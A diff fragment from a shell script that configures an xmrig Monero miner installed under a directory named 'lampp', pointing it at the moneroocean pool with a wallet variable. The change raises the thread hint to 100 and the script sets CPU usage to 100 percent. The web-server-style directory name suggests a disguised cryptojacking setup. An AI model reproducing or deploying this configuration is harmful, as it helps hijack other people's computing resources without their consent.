@@ -189,7 +189,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/lam
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/lampp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/lampp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/lampp/config.json
-sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/lampp/config.json
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 100,/' $HOME/lampp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/lampp/xmrig.log'",#' $HOME/lampp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/lampp/config.json
 
